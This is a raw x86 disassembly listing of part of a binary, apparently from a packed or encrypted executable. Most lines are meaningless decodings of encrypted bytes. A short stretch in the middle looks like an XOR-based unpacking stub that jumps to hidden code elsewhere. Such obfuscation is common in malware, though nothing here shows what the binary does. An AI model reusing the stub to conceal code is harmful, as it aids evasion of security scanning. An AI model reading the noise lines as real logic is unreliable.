  40f29d:	or     DWORD PTR [ebp+0x221c18fd],esi
  40f2a3:	in     eax,dx
  40f2a4:	xor    cl,bh
  40f2a6:	add    al,0x19
  40f2a8:	sti    
  40f2a9:	mov    bl,0x45
  40f2ab:	mov    ecx,0xb303b03a
  40f2b0:	jbe    0x40f30c
  40f2b2:	mov    esi,0x992bfa67
  40f2b7:	shr    BYTE PTR [edx],1
  40f2b9:	cmp    eax,0xc2936c5c
  40f2be:	mov    ch,0xd5
  40f2c0:	xor    DWORD PTR [esi-0x6a],eax
  40f2c3:	push   eax
  40f2c4:	add    al,0x6a
  40f2c6:	test   eax,0x8cab1d2
  40f2cb:	mov    cl,0x68
  40f2cd:	xor    eax,0x2661dee4
  40f2d2:	(bad)  
  40f2d3:	retf   
  40f2d4:	aad    0xc3
  40f2d6:	sbb    BYTE PTR [edx],al
  40f2d8:	or     al,0xc2
  40f2da:	mov    ah,0x5e
  40f2dc:	ret    0xb1fc
  40f2df:	inc    edx
  40f2e0:	push   0xfffffff4
  40f2e2:	xor    BYTE PTR [eax-0x22],cl
  40f2e5:	lahf   
  40f2e6:	jmp    0xb00814f4
  40f2eb:	fucomp st(6)
  40f2ed:	repz (bad) 
  40f2ef:	int    0x6e
  40f2f1:	ja     0x40f36f
  40f2f3:	mov    edi,0x5896e650
  40f2f8:	repz inc esp
  40f2fa:	call   0x7b57:0x41331238
  40f301:	adc    DWORD PTR [ecx+0x5a],0x76
  40f305:	mov    al,ds:0x575a5853
  40f30a:	jg     0x40f2e3
  40f30c:	retf   0xc8a9
  40f30f:	mov    ds:0xec7bb7c4,eax
  40f314:	push   cs
  40f315:	arpl   bx,si
  40f317:	icebp  
  40f318:	test   eax,0x71bcbb7b
  40f31d:	cmp    DWORD PTR [ebp+0x61],0x9b2ec1c4
  40f324:	stos   DWORD PTR es:[edi],eax
  40f325:	dec    edx
  40f326:	adc    eax,0x2ac0edd5
  40f32b:	cmc    
  40f32c:	and    eax,0x1eacb40b
  40f331:	shr    DWORD PTR [edi+0x3b],0x18
  40f335:	or     edi,DWORD PTR [ecx]
  40f337:	(bad)  
  40f338:	adc    ecx,ebp
  40f33a:	mov    ebp,0xb3c6df15
  40f33f:	xor    dl,BYTE PTR ds:0xf16babd2
  40f345:	inc    esi
  40f346:	pop    ebx
  40f347:	call   0xa2a7b3dc
  40f34c:	lods   eax,DWORD PTR ds:[esi]
  40f34d:	mov    esi,0x7ed76275
  40f352:	xor    al,0x82
  40f354:	bnd jae 0x40f340
  40f357:	pop    eax
  40f358:	mov    cl,0x33
  40f35a:	xor    cl,BYTE PTR [eax]
  40f35c:	adc    DWORD PTR [esi-0x21935b68],0xffffffbe
  40f363:	retf   
  40f364:	adc    al,0x6d
  40f366:	sbb    al,0x37
  40f368:	scas   eax,DWORD PTR es:[edi]
  40f369:	jg     0x40f2ef
  40f36b:	scas   al,BYTE PTR es:[edi]
  40f36c:	(bad)  
  40f36d:	fwait
  40f36e:	xchg   bl,bl
  40f370:	ds test eax,0x860f1318
  40f376:	pushf  
  40f377:	jo     0x40f31a
  40f379:	hlt    
  40f37a:	sahf   
  40f37b:	aad    0x35
  40f37d:	xor    eax,0xecc59b15
  40f382:	inc    esp
  40f383:	imul   ecx,DWORD PTR [esi],0xffffff9c
  40f386:	sbb    al,0x65
  40f388:	add    BYTE PTR [ecx+0x68],ah
  40f38b:	sub    eax,0x3d6be3b2
  40f390:	es xchg esp,eax
  40f392:	fs jmp 0xd46dce71
  40f398:	(bad)  
  40f399:	les    esp,FWORD PTR [ecx+0x54]
  40f39c:	jb     0x40f3ae
  40f39e:	inc    ebp
  40f39f:	es mov edi,0x6e03d34b
  40f3a5:	xchg   DWORD PTR [ebx],esi
  40f3a7:	sbb    BYTE PTR [ecx-0x1e924515],al
  40f3ad:	repz xor ebp,edx
  40f3b0:	jg     0x40f349
  40f3b2:	ins    DWORD PTR es:[edi],dx
  40f3b3:	loope  0x40f3b0
  40f3b5:	jmp    DWORD PTR [ecx+0x7c00eec5]
  40f3bb:	sti    
  40f3bc:	test   al,0x81
  40f3be:	mov    bh,0x77
  40f3c0:	icebp  
  40f3c1:	or     ah,BYTE PTR [esi]
  40f3c3:	jmp    0x7377566f
  40f3c8:	stc    
  40f3c9:	daa    
  40f3ca:	mov    al,0x5
  40f3cc:	or     BYTE PTR [edi+ebp*4+0x50],dh
  40f3d0:	mov    al,0xd3
  40f3d2:	pop    esi
  40f3d3:	(bad)  
  40f3d4:	adc    al,0x47
  40f3d6:	dec    eax
  40f3d7:	repnz and BYTE PTR [ebp+0x37],ch
  40f3db:	mov    DWORD PTR [esi+0x23],0xe0aa0520
  40f3e2:	sub    edi,DWORD PTR [ebx+0x71]
  40f3e5:	sub    esi,ecx
  40f3e7:	out    0x85,eax
  40f3e9:	inc    edx
  40f3ea:	pop    es
  40f3eb:	mov    ds:0x5db82367,eax
  40f3f0:	(bad)  
  40f3f1:	xchg   ebx,eax
  40f3f2:	or     al,0x59
  40f3f4:	or     ebx,DWORD PTR [esi-0xed61436]
  40f3fa:	jp     0x40f45b
  40f3fc:	mov    ds:0x146c4a8c,al
  40f401:	mov    cl,0x9f
  40f403:	jnp    0x40f41c
  40f405:	sahf   
  40f406:	gs ret 0xe86d
  40f40a:	add    esi,edi
  40f40c:	pop    ss
  40f40d:	lea    esp,[eax-0x11]
  40f410:	(bad)  
  40f411:	sbb    eax,0xd5a34a23
  40f416:	push   0xffffffdf
  40f418:	xor    BYTE PTR [edx+eiz*2-0x3e],al
  40f41c:	leave  
  40f41d:	retf   
  40f41e:	leave  
  40f41f:	inc    esp
  40f420:	cmp    DWORD PTR ds:0x8549f4fe,esp
  40f426:	xor    ebp,DWORD PTR [ebp+0x151d909a]
  40f42c:	xor    dh,BYTE PTR [ebp-0x7d]
  40f42f:	inc    ebp
  40f430:	shl    BYTE PTR [edi+edi*4-0x450406d6],cl
  40f437:	xchg   ebx,eax
  40f438:	inc    edi
  40f439:	sub    BYTE PTR [eax],dh
  40f43b:	adc    ah,BYTE PTR [edi*2-0x7347651f]
  40f442:	popa   
  40f443:	and    DWORD PTR [ebx-0x29206807],edx
  40f449:	stos   DWORD PTR es:[edi],eax
  40f44a:	dec    DWORD PTR [esi+0x54a6f5e5]
  40f450:	push   edi
  40f451:	jne    0x40f4c9
  40f453:	mov    eax,0x8253f5c2
  40f458:	test   al,0xd8
  40f45a:	loope  0x40f416
  40f45c:	xor    al,0x41
  40f45e:	push   eax
  40f45f:	pop    edi
  40f460:	add    DWORD PTR [ebx],edi
  40f462:	and    BYTE PTR [edx-0x1471d51a],ah
  40f468:	mov    edx,0x3c2dc504
  40f46d:	rol    DWORD PTR [eax-0x61],1
  40f470:	fidivr DWORD PTR [edx+0x2b8e64f1]
  40f476:	inc    edi
  40f477:	xchg   BYTE PTR [ebx+0x24],ch
  40f47a:	xchg   BYTE PTR [edx],bl
  40f47c:	lods   al,BYTE PTR ds:[esi]
  40f47d:	jns    0x40f42e
  40f47f:	dec    ebp
  40f480:	nop
  40f481:	sub    cl,cl
  40f483:	cwde   
  40f484:	xchg   ecx,eax
  40f485:	fidiv  DWORD PTR [eax]
  40f487:	sub    BYTE PTR [eax+0x39abb694],ah
  40f48d:	inc    ebp
  40f48e:	push   ecx
  40f48f:	mov    ah,0xd2
  40f491:	cmc    
  40f492:	cmc    
  40f493:	jns    0x40f42a
  40f495:	jbe    0x40f480
  40f497:	or     al,BYTE PTR [eax+ebx*1]
  40f49a:	mov    bl,0xa1
  40f49c:	push   0xfffffff1
  40f49e:	jnp    0x40f440
  40f4a0:	aam    0xfd
  40f4a2:	ret    
  40f4a3:	add    DWORD PTR [eax-0x3b9ab20c],esp
  40f4a9:	dec    ecx
  40f4aa:	iret   
  40f4ab:	mov    DWORD PTR [ebp-0x5b],ebx
  40f4ae:	push   es
  40f4af:	add    BYTE PTR [edx],0x4f
  40f4b2:	xor    ch,BYTE PTR [ebp+0x78]
  40f4b5:	sbb    DWORD PTR [edi-0x2b50ab30],0x3abf460b
  40f4bf:	mov    ?,WORD PTR [edx-0x5c]
  40f4c2:	repz ja 0x40f48d
  40f4c5:	repnz xor DWORD PTR [edi+0x74e87562],edx
  40f4cc:	ret    0x17b9
  40f4cf:	xchg   ebx,eax
  40f4d0:	dec    esp
  40f4d1:	dec    edi
  40f4d2:	pop    ebp
  40f4d3:	dec    ebp
  40f4d4:	xor    BYTE PTR [esi-0x6ce7fe8],ch
  40f4da:	lea    esp,[ecx-0x46]
  40f4dd:	pop    ecx
  40f4de:	pop    esi
  40f4df:	jge    0x40f4d2
  40f4e1:	pop    es
  40f4e2:	adc    cl,BYTE PTR [ebx+0x1dc175a5]
  40f4e8:	repnz cld 
  40f4ea:	push   edi
  40f4eb:	mov    ch,0xe
  40f4ed:	xchg   edx,eax
  40f4ee:	xor    al,BYTE PTR [eax-0x4b]
  40f4f1:	int3   
  40f4f2:	inc    edx
  40f4f3:	cmp    edx,DWORD PTR [ecx]
  40f4f5:	arpl   WORD PTR [edi+0x66986073],di
  40f4fb:	aaa    
  40f4fc:	fidivr WORD PTR ds:0xd67bcbd5
  40f502:	push   edi
  40f503:	inc    ebx
  40f504:	push   ds
  40f505:	aad    0x30
  40f507:	pop    ebx
  40f508:	test   eax,0xfba6a7ab
  40f50d:	cli    
  40f50e:	jge    0x40f523
  40f510:	cmc    
  40f511:	sar    BYTE PTR [ebx],cl
  40f513:	and    ch,BYTE PTR [ebp-0xc]
  40f516:	ins    DWORD PTR es:[edi],dx
  40f517:	neg    BYTE PTR [ebp-0x4e]
  40f51a:	dec    edi
  40f51b:	iret   
  40f51c:	xchg   BYTE PTR fs:[ecx],bh
  40f51f:	je     0x40f51e
  40f521:	in     al,0x6e
  40f523:	cs inc ebp
  40f525:	and    ebx,ecx
  40f527:	inc    esp
  40f528:	pop    ss
  40f529:	stos   BYTE PTR es:[edi],al
  40f52a:	in     al,dx
  40f52b:	sbb    BYTE PTR [edx],bh
  40f52d:	mov    bl,0xcc
  40f52f:	ds jp  0x40f4b7
  40f532:	fiadd  DWORD PTR [ebx+ebx*8-0x77]
  40f536:	mov    ss,WORD PTR [ebx]
  40f538:	mov    dl,0xb2
  40f53a:	inc    esp
  40f53b:	repz dec eax
  40f53d:	mov    ch,0x21
  40f53f:	popa   
  40f540:	or     BYTE PTR [ecx],cl
  40f542:	(bad)  
  40f543:	xchg   ebp,eax
  40f544:	dec    ebx
  40f545:	sub    ebp,edi
  40f547:	gs xchg ebp,eax
  40f549:	add    BYTE PTR [ebp+0x499ac194],0x5e
  40f550:	fnstcw WORD PTR [ebx+0x34ecdf62]
  40f556:	test   eax,0xb7961e8d
  40f55b:	mov    bh,0x89
  40f55d:	inc    edx
  40f55e:	mov    al,ds:0xc655823c
  40f563:	dec    edi
  40f564:	pop    esi
  40f565:	les    ecx,FWORD PTR [edi+0x32]
  40f568:	int3   
  40f569:	mov    gs,WORD PTR [ecx+0x60749852]
  40f56f:	into   
  40f570:	cmp    al,dh
  40f572:	and    ah,BYTE PTR [ecx+0x18c81d3a]
  40f578:	enter  0xbcc5,0x65
  40f57c:	and    ch,BYTE PTR [edx+ebx*8]
  40f57f:	or     esp,edx
  40f581:	js     0x40f580
  40f583:	push   ss
  40f584:	cmc    
  40f585:	dec    edx
  40f586:	ins    BYTE PTR es:[edi],dx
  40f587:	pop    esp
  40f588:	sub    DWORD PTR [edx],esi
  40f58a:	fsub   DWORD PTR [edi+0x79b5c1b4]
  40f590:	aas    
  40f591:	dec    edi
  40f592:	and    edx,eax
  40f594:	outs   dx,BYTE PTR ds:[esi]
  40f595:	std    
  40f596:	fisubr WORD PTR [edx-0x48]
  40f599:	or     ebx,DWORD PTR [edx+eax*1+0x6639e133]
  40f5a0:	jmp    0x88be:0x488cd123
  40f5a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5a8:	jo     0x40f5ec
  40f5aa:	inc    edi
  40f5ab:	stos   BYTE PTR es:[edi],al
  40f5ac:	inc    ecx
  40f5ad:	icebp  
  40f5ae:	xchg   ebx,eax
  40f5af:	les    eax,FWORD PTR [ebx]
  40f5b1:	add    eax,DWORD PTR [edi]
  40f5b3:	sbb    ebx,DWORD PTR [ebx-0x1c]
  40f5b6:	cwde   
  40f5b7:	das    
  40f5b8:	out    0xb0,eax
  40f5ba:	xor    eax,0xfed9eba8
  40f5bf:	or     cl,BYTE PTR [ecx-0x13]
  40f5c2:	inc    ebx
  40f5c3:	push   esp
  40f5c4:	adc    BYTE PTR ds:0xb5f1c36c,al
  40f5ca:	clc    
  40f5cb:	dec    edi
  40f5cc:	cmp    eax,0x70a9eba0
  40f5d1:	fst    DWORD PTR [esi-0x73]
  40f5d4:	cli    
  40f5d5:	xor    ch,bh
  40f5d7:	les    edx,FWORD PTR [ebx+0x6e]
  40f5da:	sbb    cl,BYTE PTR [ecx+0x4ce90039]
  40f5e0:	stos   BYTE PTR es:[edi],al
  40f5e1:	cmp    al,0x68
  40f5e3:	push   ds
  40f5e4:	mov    al,ds:0x9d5d2a71
  40f5e9:	cmp    eax,0x4151145a
  40f5ee:	or     ecx,ecx
  40f5f0:	add    dl,dh
  40f5f2:	aas    
  40f5f3:	xchg   edx,eax
  40f5f4:	in     eax,0xe9
  40f5f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5f7:	inc    edx
  40f5f8:	loop   0x40f663
  40f5fa:	inc    eax
  40f5fb:	jmp    0x4920:0x34fae6c7
  40f602:	scas   al,BYTE PTR es:[edi]
  40f603:	inc    eax
  40f604:	dec    BYTE PTR [esi+esi*1-0x70]
  40f608:	and    DWORD PTR [eax],esp
  40f60a:	int3   
  40f60b:	ret    0x5455
  40f60e:	jae    0x40f5b7
  40f610:	pop    ecx
  40f611:	and    ebp,DWORD PTR [eax-0x2c]
  40f614:	(bad)  
  40f615:	leave  
  40f616:	call   0xc604:0xf14a9aeb
  40f61d:	xchg   edi,eax
  40f61e:	mov    al,0xff
  40f620:	call   DWORD PTR [ebp+0x3607ee56]
  40f626:	and    esp,0xffffff9f
  40f629:	cmp    eax,DWORD PTR [edx+0x5e]
  40f62c:	(bad)  
  40f62d:	mov    edi,0xee9bbfc
  40f632:	retf   0x93cc
  40f635:	cmp    BYTE PTR [edx+ebx*8],0x91
  40f639:	int3   
  40f63a:	mov    ebp,0x9ce3f7b0
  40f63f:	in     eax,dx
  40f640:	rcl    BYTE PTR [ebp-0x3d247636],1
  40f646:	jb     0x40f5dc
  40f648:	dec    edi
  40f649:	push   esp
  40f64a:	mov    BYTE PTR [ebx-0x686b6d38],bl
  40f650:	inc    ebx
  40f651:	add    ah,BYTE PTR ds:0x11a26273
  40f657:	and    dh,BYTE PTR [ebx]
  40f659:	jbe    0x40f6c3
  40f65b:	and    al,0xa8
  40f65d:	jae    0x40f639
  40f65f:	cmp    DWORD PTR [ecx-0x1c],ebp
  40f662:	int3   
  40f663:	cmp    BYTE PTR [ebp-0x7b],ch
  40f666:	lock inc ecx
  40f668:	inc    esp
  40f669:	mov    WORD PTR [edi-0x2b051345],cs
  40f66f:	fisttp DWORD PTR [eax]
  40f671:	pop    esi
  40f672:	jnp    0x40f618
  40f674:	lods   al,BYTE PTR ds:[esi]
  40f675:	call   0x18c9d2a0
  40f67a:	adc    al,0xe0
  40f67c:	loopne 0x40f62c
  40f67e:	adc    eax,esi
  40f680:	adc    edx,esp
  40f682:	loope  0x40f67c
  40f684:	pop    edi
  40f685:	add    al,0x19
  40f687:	jle    0x40f693
  40f689:	xor    DWORD PTR [esi-0x6],esi
  40f68c:	daa    
  40f68d:	test   DWORD PTR [eax+ebp*1-0x4b],0x9fc4f8ae
  40f695:	lods   al,BYTE PTR ds:[esi]
  40f696:	mov    ds:0x99001d54,eax
  40f69b:	cmc    
  40f69c:	arpl   WORD PTR es:[edi+0x53c10f07],ax
  40f6a3:	dec    eax
  40f6a4:	lock xor dl,ah
  40f6a7:	aaa    
  40f6a8:	push   es
  40f6a9:	jmp    0x89ecdfec
  40f6ae:	fst    DWORD PTR [edi-0x193b702a]
  40f6b4:	dec    ebp
  40f6b5:	mov    cl,0x36
  40f6b7:	lods   al,BYTE PTR ds:[esi]
  40f6b8:	pop    bp
  40f6ba:	repz jle 0x40f650
  40f6bd:	mov    ebx,edx
  40f6bf:	in     al,0xce
  40f6c1:	bts    DWORD PTR [esi],0xd
  40f6c5:	mov    ecx,0x49539aaa
  40f6ca:	inc    ebp
  40f6cb:	int3   
  40f6cc:	and    eax,0x6db0063
  40f6d1:	(bad)  
  40f6d3:	inc    edx
  40f6d4:	pusha  
  40f6d5:	fidivr DWORD PTR [eax+eax*2-0x1d]
  40f6d9:	inc    edx
  40f6da:	jne    0x40f74e
  40f6dc:	cmp    eax,0xca84f91c
  40f6e1:	or     BYTE PTR [edx],al
  40f6e3:	js     0x40f6cf
  40f6e5:	int    0x8
  40f6e7:	call   0x8921590
  40f6ec:	arpl   WORD PTR [edi+0x5f03ef57],di
  40f6f2:	mov    bl,0xc0
  40f6f4:	and    dh,bh
  40f6f6:	call   0xd5a:0x891190d8
  40f6fd:	push   cs
  40f6fe:	xchg   ebp,eax
  40f6ff:	lock mov ds:0x56786a9d,al
  40f705:	fucomip st,st(1)
  40f707:	fild   QWORD PTR [edx]
  40f709:	xchg   esp,eax
  40f70a:	loop   0x40f6eb
  40f70c:	jmp    0x40f721
  40f70e:	or     eax,0xddec33ef
  40f713:	cwde   
  40f714:	xchg   ecx,eax
  40f715:	fsubr  st,st(0)
  40f717:	dec    esp
  40f718:	mov    ds:0x542673f7,eax
  40f71d:	iret   
  40f71e:	dec    eax
  40f71f:	mov    ch,0x18
  40f721:	push   esi
  40f722:	sbb    cl,dl
  40f724:	mov    bh,0x7b
  40f726:	mov    bh,0xd7
  40f728:	stc    
  40f729:	call   ebx
  40f72b:	jle    0x40f706
  40f72d:	inc    eax
  40f72e:	cmp    al,0x65
  40f730:	and    dl,bl
  40f732:	in     al,dx
  40f733:	test   DWORD PTR [ebp-0x119315fc],ebx
  40f739:	gs aam 0x8b
  40f73c:	sbb    cl,BYTE PTR [ebp+ebx*2-0x4f]
  40f740:	repz jno 0x40f780
  40f743:	cld    
  40f744:	ins    DWORD PTR es:[edi],dx
  40f745:	jbe    0x40f747
  40f747:	stos   DWORD PTR es:[edi],eax
  40f748:	ret    0xcd43
  40f74b:	mov    edi,0x15833695
  40f750:	std    
  40f751:	mov    dl,0x5e
  40f753:	(bad)  
  40f754:	jnp    0x40f742
  40f756:	sub    ch,0x53
  40f759:	mov    ebp,0xbc389854
  40f75e:	xchg   esi,eax
  40f75f:	xor    cl,BYTE PTR [ebp+0x7c]
  40f762:	loopne 0x40f7c2
  40f764:	sub    al,0xf1
  40f766:	data16 mov ah,0x80
  40f769:	jle    0x40f785
  40f76b:	pop    esi
  40f76c:	in     eax,dx
  40f76d:	mov    bh,0xb5
  40f76f:	pop    DWORD PTR [esi+eax*1]
  40f772:	xor    al,0xd6
  40f774:	and    BYTE PTR [edx+0x2d],0x4b
  40f778:	mov    cl,0x4f
  40f77a:	hlt    
  40f77b:	cmp    DWORD PTR [ebx-0x69],eax
  40f77e:	push   es
  40f77f:	adc    edi,eax
  40f781:	mov    edx,0x7b3bd494
  40f786:	or     eax,esp
  40f788:	lea    edi,[esi-0x4]
  40f78b:	mov    esp,0x2c4d6a22
  40f790:	xor    al,dh
  40f792:	fidivr WORD PTR [ebx-0x2c]
  40f795:	push   ebx
  40f796:	sub    esi,DWORD PTR [eax-0x238c6377]
  40f79c:	cdq    
  40f79d:	mov    ds:0xd22abe52,eax
  40f7a2:	adc    al,0x61
  40f7a4:	mov    edx,DWORD PTR [eax-0x20]
  40f7a7:	scas   al,BYTE PTR es:[edi]
  40f7a8:	iret   
  40f7a9:	cli    
  40f7aa:	add    al,0x1b
  40f7ac:	dec    ebx
  40f7ad:	push   ecx
  40f7ae:	pushf  
  40f7af:	daa    
  40f7b0:	(bad)  
  40f7b1:	jecxz  0x40f7ce
  40f7b3:	sbb    al,0x91
  40f7b5:	sbb    esp,DWORD PTR [esi-0x69cc2551]
  40f7bb:	in     al,0xd8
  40f7bd:	idiv   edi
  40f7bf:	leave  
  40f7c0:	jmp    0x40f800
  40f7c2:	pusha  
  40f7c3:	ds lock scas al,BYTE PTR es:[edi]
  40f7c6:	mov    ecx,0x75108b3
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x42fa38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0x96dd9529
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	cmp    eax,0xb9d839f4
  40f875:	ret    
  40f876:	in     eax,0x49
  40f878:	stos   DWORD PTR es:[edi],eax
  40f879:	fnstsw WORD PTR [esi]
  40f87b:	adc    dl,BYTE PTR [edi]
  40f87d:	or     DWORD PTR [edi+0x3acaae59],0x7eb388ff
  40f887:	cdq    
  40f888:	dec    edi
  40f889:	cmp    BYTE PTR [eax-0x7],cl
  40f88c:	pop    ebx
  40f88d:	cmp    al,0x21
  40f88f:	pop    ebp
  40f890:	xor    al,0x3b
  40f892:	aad    0xbc
  40f894:	retf   0x46de
  40f897:	ret    
  40f898:	push   ebx
  40f899:	push   eax
  40f89a:	(bad)  
  40f89b:	daa    
  40f89c:	loope  0x40f8df
  40f89e:	push   ss
  40f89f:	push   0x4c
  40f8a1:	xchg   ebx,eax
  40f8a2:	outs   dx,BYTE PTR ds:[esi]
  40f8a3:	jl     0x40f910
  40f8a5:	call   0x536c5810
  40f8aa:	xchg   BYTE PTR [edx+0x5e4dc7fb],ah
  40f8b0:	cmp    BYTE PTR [ecx+0x39],ah
  40f8b3:	cmp    bl,BYTE PTR [ebp-0x11]
  40f8b6:	(bad)  
  40f8b7:	mov    edi,0xbafda833
  40f8bc:	(bad)  
  40f8bd:	sub    ebp,edx
  40f8bf:	les    esp,FWORD PTR [ecx+0x39e92c8e]
  40f8c5:	push   ds
  40f8c6:	sbb    al,0x3f
  40f8c8:	dec    edi
  40f8c9:	fwait
  40f8ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8cb:	not    ah
  40f8cd:	ins    DWORD PTR es:[edi],dx
  40f8ce:	adc    ah,BYTE PTR [ecx+0x33]
  40f8d1:	scas   al,BYTE PTR es:[edi]
  40f8d2:	mov    fs,WORD PTR [ebx+0xe4b6d0b]
  40f8d8:	dec    ebx
  40f8d9:	sbb    edi,DWORD PTR [esp+esi*1+0x3de2edef]
  40f8e0:	ret    
  40f8e1:	xchg   edx,eax
  40f8e2:	aas    
  40f8e3:	jae    0x40f923
  40f8e5:	adc    al,0x18
  40f8e7:	mov    cl,BYTE PTR [esi+0x4f]
  40f8ea:	pusha  
  40f8eb:	addr16 mov eax,ds:0x5518
  40f8ef:	out    dx,eax
  40f8f0:	xor    ecx,DWORD PTR [esi]
  40f8f2:	or     ecx,DWORD PTR [edi]
  40f8f4:	outs   dx,DWORD PTR ds:[esi]
  40f8f5:	mov    ds:0x7c6ebf6b,al
  40f8fa:	pusha  
  40f8fb:	test   DWORD PTR [ebx+ebx*2-0x36],0xecd2f2a6
  40f903:	popa   
  40f904:	test   eax,0xcc894c6
  40f909:	data16 fsub st,st(0)
  40f90c:	mov    eax,ds:0x74de623a
  40f911:	(bad)  
  40f912:	repnz mov ebx,0xb284845e
  40f918:	jnp    0x40f917
  40f91a:	jp     0x40f947
  40f91c:	mov    eax,0x71d39de2
  40f921:	bound  ecx,QWORD PTR [ebx+0x16]
  40f924:	pushf  
  40f925:	sbb    eax,0x4261c783
  40f92a:	hlt    
  40f92b:	inc    ecx
  40f92c:	lea    ebp,[edx-0x48e0a6d3]
  40f932:	je     0x40f8db
  40f934:	ret    
  40f935:	adc    DWORD PTR [edx+0x23],0x5e73ac63
  40f93c:	pop    es
  40f93d:	dec    esp
  40f93e:	ja     0x40f8c5
  40f940:	xchg   bx,ax
  40f942:	pop    edi
  40f943:	cld    
  40f944:	or     ecx,esp
  40f946:	push   es
  40f947:	jmp    0x40f929
  40f949:	sti    
  40f94a:	dec    esi
  40f94b:	aam    0x0
  40f94d:	xchg   al,bl
  40f94f:	jne    0x40f998
  40f951:	adc    DWORD PTR [edx+0x23f83109],0xecc0e759
  40f95b:	push   ebp
  40f95c:	or     al,dl
  40f95e:	mov    es,WORD PTR [eax-0x339079c0]
  40f964:	fwait
  40f965:	aam    0xa1
  40f967:	cmp    BYTE PTR [edi],ch
  40f969:	ja     0x40f8f9
  40f96b:	neg    BYTE PTR [esi+0x29988df9]
  40f971:	push   0x711cacb6
  40f976:	shl    BYTE PTR [eax+esi*8],1
  40f979:	cmp    al,0xc3
  40f97b:	jmp    DWORD PTR [esi+0x23]
  40f97e:	pop    ds
  40f97f:	lods   al,BYTE PTR ds:[esi]
  40f980:	jno    0x40f973
  40f982:	lods   eax,DWORD PTR ds:[esi]
  40f983:	icebp  
  40f984:	adc    esi,DWORD PTR [eax+0x219d4ecb]
  40f98a:	dec    esi
  40f98b:	push   cs
  40f98c:	push   cs
  40f98d:	and    al,bl
  40f98f:	ins    BYTE PTR es:[edi],dx
  40f990:	aaa    
  40f991:	push   edx
  40f992:	or     al,0xf4
  40f994:	push   eax
  40f995:	cli    
  40f996:	jne    0x40f99d
  40f998:	addr16 jmp 0x7cbeed79
  40f99e:	xchg   ebp,eax
  40f99f:	into   
  40f9a0:	pop    ecx
  40f9a1:	inc    esp
  40f9a2:	fnsave [edx+0x792b5a31]
  40f9a8:	addr16 pusha 
  40f9aa:	and    BYTE PTR [ebp+0x43],ch
  40f9ad:	cwde   
  40f9ae:	arpl   WORD PTR [ecx],sp
  40f9b0:	add    ecx,esp
  40f9b2:	jp     0x40f94c
  40f9b4:	iret   
  40f9b5:	add    al,0x20
  40f9b7:	popa   
  40f9b8:	fiadd  DWORD PTR [ebp+0x44]
  40f9bb:	sbb    BYTE PTR [edx],bl
  40f9bd:	mov    cl,0x3
  40f9bf:	pop    ebp
  40f9c0:	push   es
  40f9c1:	mov    esp,0xc02a1af6
  40f9c6:	xchg   ebx,eax
  40f9c7:	cdq    
  40f9c8:	push   0x39
  40f9ca:	xor    al,0x29
  40f9cc:	jge    0x40fa40
  40f9ce:	jns    0x40f9f9
  40f9d0:	mov    ebp,0xc317e19a
  40f9d5:	cs jbe 0x40f9a2
  40f9d8:	ins    BYTE PTR es:[edi],dx
  40f9d9:	shr    ecx,1
  40f9db:	mov    dl,0x92
  40f9dd:	xchg   esp,eax
  40f9de:	mov    WORD PTR [ebx],gs
  40f9e0:	aaa    
  40f9e1:	sub    bl,cl
  40f9e3:	adc    bh,ah
  40f9e5:	sbb    eax,0xf9ac0420
  40f9ea:	icebp  
  40f9eb:	adc    bl,ah
  40f9ed:	mov    cl,0xf1
  40f9ef:	aad    0x40
  40f9f1:	pop    ecx
  40f9f2:	pushf  
  40f9f3:	sub    dl,cl
  40f9f5:	sti    
  40f9f6:	mov    ebx,0xddf5fc23
  40f9fb:	and    eax,0x6abfae48
  40fa00:	stos   BYTE PTR es:[edi],al
  40fa01:	std    
  40fa02:	xchg   edi,eax
  40fa03:	neg    DWORD PTR [edi+0x10fc3f09]
  40fa09:	jmp    0x40fa55
  40fa0b:	push   esi
  40fa0c:	xor    eax,0xeffa80e7
  40fa11:	rcl    DWORD PTR [edi],1
  40fa13:	imul   ebp,DWORD PTR [edi-0x3dd716ee],0x6a
  40fa1a:	lods   eax,DWORD PTR ds:[esi]
  40fa1b:	rcl    ecx,1
  40fa1d:	add    eax,0x4b0512a6
  40fa22:	push   DWORD PTR [ecx]
  40fa24:	mov    ecx,0x46858b98
  40fa29:	cmp    al,bh
  40fa2b:	aad    0x3c
  40fa2d:	nop
  40fa2e:	sub    bh,BYTE PTR [esi]
  40fa30:	lods   al,BYTE PTR ds:[esi]
  40fa31:	or     al,0x78
  40fa33:	ror    BYTE PTR [ebp+0x67c49ca8],cl
  40fa39:	int3   
  40fa3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa3b:	(bad)  
  40fa3c:	jge    0x40fa8a
  40fa3e:	addr16 mov bh,0xcc
  40fa41:	mov    WORD PTR [ecx-0x34],fs
  40fa44:	dec    ecx
  40fa45:	add    bh,BYTE PTR [edx-0x51]
